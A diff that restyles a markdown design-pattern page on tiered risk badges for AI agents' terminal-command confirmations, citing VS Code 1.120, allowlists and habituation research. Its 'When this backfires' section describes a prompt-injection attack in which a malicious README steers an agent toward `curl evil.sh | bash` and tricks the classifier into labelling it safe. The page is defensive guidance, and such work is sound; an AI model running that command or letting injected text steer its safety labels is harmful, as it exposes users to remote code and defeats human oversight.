@@ -19,21 +19,21 @@ maturity: established
 
 > A tiered risk badge before a terminal command is an attention lever, not a gate; it tunes which confirmations get read, while allowlists enforce policy.
 
-## The Problem Risk Badges Address
+## The problem risk badges address
 
-[Confirmation gates](human-in-the-loop-confirmation-gates.md) fail when every prompt looks identical — reviewers pattern-match and approve without reading.
+[Confirmation gates](human-in-the-loop-confirmation-gates.md) fail when every prompt looks identical. Reviewers pattern-match and approve without reading.
 
-A tiered badge changes the cost calculus. A green "Safe" chip on `ls -la` and a red "Review carefully" chip on `git push --force origin main` are visibly different, so attention concentrates where it should. The badge does not gate the action — the allowlist, deny rule, or confirmation gate still does. It only tunes which gates a human reads.
+A tiered badge changes what each prompt costs to read. A green "Safe" chip on `ls -la` and a red "Review carefully" chip on `git push --force origin main` look different, so attention concentrates where it should. The badge does not gate the action. The allowlist, deny rule, or confirmation gate still does that. The badge only tunes which gates a human reads.
 
-## The VS Code 1.120 Reference Implementation
+## The VS Code 1.120 reference implementation
 
 VS Code 1.120 (May 2026) ships this behind `chat.tools.riskAssessment.enabled`. From the [release notes](https://code.visualstudio.com/updates/v1_120): "terminal command confirmations now include a risk badge with an AI-generated explanation of what the command does."
 
 | Tier | Color | Triggers |
 |---|---|---|
-| **Safe** | green | "reads files or prints output without making changes" |
-| **Caution** | orange | "modifies the workspace, installs packages, or sends data over the network" |
-| **Review carefully** | red | "performs an action that may be difficult or impossible to undo, such as force-pushing to a remote or deleting files outside the workspace" |
+| Safe | green | "reads files or prints output without making changes" |
+| Caution | orange | "modifies the workspace, installs packages, or sends data over the network" |
+| Review carefully | red | "performs an action that may be difficult or impossible to undo, such as force-pushing to a remote or deleting files outside the workspace" |
 
 Each badge ships with "a one-sentence summary tailored to the specific command" — that command-specific text is what makes the badge an attention lever.
 
@@ -49,17 +49,17 @@ graph TD
     F --> G
 ```
 
-## Design Rules That Separate Signal From Decoration
+## Design rules that separate signal from decoration
 
-**Three tiers, no more.** Two collapse to a binary prompt; four or more blur the signal — operators stop distinguishing "Caution" from "Review carefully".
+Use three tiers, no more. Two collapse to a binary prompt. Four or more blur the signal, so operators stop telling "Caution" from "Review carefully".
 
-**Command-specific text, not boilerplate.** "Review carefully — may be hard to undo" is generic. "Review carefully — force-pushes to `main` and overwrites remote history" is a load-bearing fact.
+Write command-specific text, not boilerplate. "Review carefully — may be hard to undo" is generic. "Review carefully — force-pushes to `main` and overwrites remote history" gives the reader a fact they can act on.
 
-**Classify on resolved scope, not raw string.** `rm -rf ./build` in a `/tmp` sandbox and the same command from a repo root where `./build` symlinks to `/` are the same string, wildly different actions. The [Theia shell-execution proposal](https://github.com/eclipse-theia/theia/issues/16772) classifies on parsed structure (binary, flags, target paths), not surface string.
+Classify on resolved scope, not the raw string. `rm -rf ./build` in a `/tmp` sandbox and the same command from a repo root where `./build` symlinks to `/` are the same string but wildly different actions. The [Theia shell-execution proposal](https://github.com/eclipse-theia/theia/issues/16772) classifies on parsed structure (binary, flags, target paths), not the surface string.
 
-**Advisory, not policy.** Allowlists, deny rules, and PreToolUse hooks carry the security guarantee. VS Code's [security docs](https://code.visualstudio.com/docs/copilot/security) note that auto-approval uses "best-effort command parsing and have known limitations with shell aliases, quote concatenation, and complex shell syntax" — a classifier on the same parsing inherits the same limits, so organizations needing a hard floor disable auto-approval via `ChatToolsTerminalEnableAutoApprove`.
+Keep the badge advisory, not policy. Allowlists, deny rules, and PreToolUse hooks carry the security guarantee. VS Code's [security docs](https://code.visualstudio.com/docs/copilot/security) note that auto-approval uses "best-effort command parsing and have known limitations with shell aliases, quote concatenation, and complex shell syntax". A classifier on the same parsing inherits the same limits, so organizations that need a hard floor disable auto-approval via `ChatToolsTerminalEnableAutoApprove`.
 
-## How Badges Layer With Allowlists
+## How badges layer with allowlists
 
 | Layer | Mechanism | Question it answers |
 |---|---|---|
@@ -68,25 +68,25 @@ graph TD
 | Risk badge | Model-generated classification | If it asks, how hard should you read? |
 | [Confirmation gate](human-in-the-loop-confirmation-gates.md) | Human decision | Approve or reject? |
 
-[Evidence-based allowlist auto-discovery](evidence-based-allowlist-auto-discovery.md) promotes safe commands off the prompt path; badges concentrate attention on the residual set. A badge on every command means the allowlist is under-tuned.
+[Evidence-based allowlist auto-discovery](evidence-based-allowlist-auto-discovery.md) promotes safe commands off the prompt path, and badges concentrate attention on the commands that remain. A badge on every command means the allowlist is under-tuned.
 
-## Calibrating the Classifier Against Decisions
+## Calibrating the classifier against decisions
 
-Joining gate decisions to badge tier surfaces miscalibration:
+Join the gate decisions to the badge tier to surface miscalibration:
 
-- **Safe with a non-trivial rejection rate** → classifier under-rates; the green chip masks commands humans read as dangerous.
-- **Review-carefully approved in under N seconds** → the top tier is being rubber-stamped.
-- **Caution with no rejections** → over-tagging, or operators trained to ignore orange.
+- Safe with a non-trivial rejection rate means the classifier under-rates: the green chip masks commands humans read as dangerous.
+- Review-carefully approved in under N seconds means the top tier is being rubber-stamped.
+- Caution with no rejections means over-tagging, or operators trained to ignore orange.
 
-## When This Backfires
+## When this backfires
 
-**Adversarial inputs steer the badge.** The Lies-in-the-Loop attack class ([Checkmarx Zero writeup](https://www.infosecurity-magazine.com/news/lies-loop-attack-ai-safety-dialogs/)) uses injected content to manipulate the safety dialog. A classifier driven by the same model under injection is in scope: a malicious README that steers the agent toward `curl evil.sh | bash` can also steer the classifier to "Safe — lists files." Mitigate by generating the classification from a separate isolated model, or compute the tier deterministically from parsed structure.
+Adversarial inputs can steer the badge. The Lies-in-the-Loop attack class ([Checkmarx Zero writeup](https://www.infosecurity-magazine.com/news/lies-loop-attack-ai-safety-dialogs/)) uses injected content to manipulate the safety dialog. A classifier driven by the same model under injection is in scope: a malicious README that steers the agent toward `curl evil.sh | bash` can also steer the classifier to "Safe — lists files." To mitigate, generate the classification from a separate isolated model, or compute the tier deterministically from parsed structure.
 
-**Color-only signal in high-volume sessions.** With dozens of green confirmations, attention collapses on the color axis before the summary text. Pair the visual signal with a textual cue (`[SAFE]` / `[CAUTION]` / `[REVIEW]` prefix) to put discriminative load on the word.
+Color-only signals fail in high-volume sessions. With dozens of green confirmations, attention collapses on the color axis before the reader reaches the summary text. Pair the visual signal with a textual cue (`[SAFE]` / `[CAUTION]` / `[REVIEW]` prefix) to put discriminative load on the word.
 
-**Fixed-appearance tiers still habituate.** Anderson et al.'s fMRI study, [How Polymorphic Warnings Reduce Habituation in the Brain](https://scholarsarchive.byu.edu/facpub/9306/) (CHI 2015), found visual-processing response to a static warning drops sharply by the *second* exposure, and that *polymorphic* warnings — ones that vary their appearance across exposures — resist that decay far better. A green "Safe" chip rendered identically across hundreds of commands is that static case: tiering separates Safe from Review-carefully, but the repeated within-tier chip still fades. Tiers reallocate attention across severity levels; they do not defeat the repetition habituation that motivated polymorphic designs and batched surfaces like the [tool confirmation carousel](../agent-design/tool-confirmation-carousel.md).
+Fixed-appearance tiers still habituate. Anderson et al.'s fMRI study, [How Polymorphic Warnings Reduce Habituation in the Brain](https://scholarsarchive.byu.edu/facpub/9306/) (CHI 2015), found that the visual-processing response to a static warning drops sharply by the second exposure, and that polymorphic warnings — ones that vary their appearance across exposures — resist that decay far better. A green "Safe" chip rendered identically across hundreds of commands is that static case: tiering separates Safe from Review-carefully, but the repeated within-tier chip still fades. Tiers reallocate attention across severity levels. They do not defeat the repetition habituation that motivated polymorphic designs and batched surfaces like the [tool confirmation carousel](../agent-design/tool-confirmation-carousel.md).
 
-**Fatigue migrates rather than dissolves.** If every command arrives with "Caution" — common in agents that install packages routinely — operators learn to ignore orange the same way they ignored the prompt. On its own, classification shifts where attention collapses, not whether.
+Fatigue migrates rather than dissolves. If every command arrives with "Caution" — common in agents that install packages routinely — operators learn to ignore orange the same way they ignored the prompt. On its own, classification shifts where attention collapses, not whether it collapses.
 
 ## Key Takeaways
 
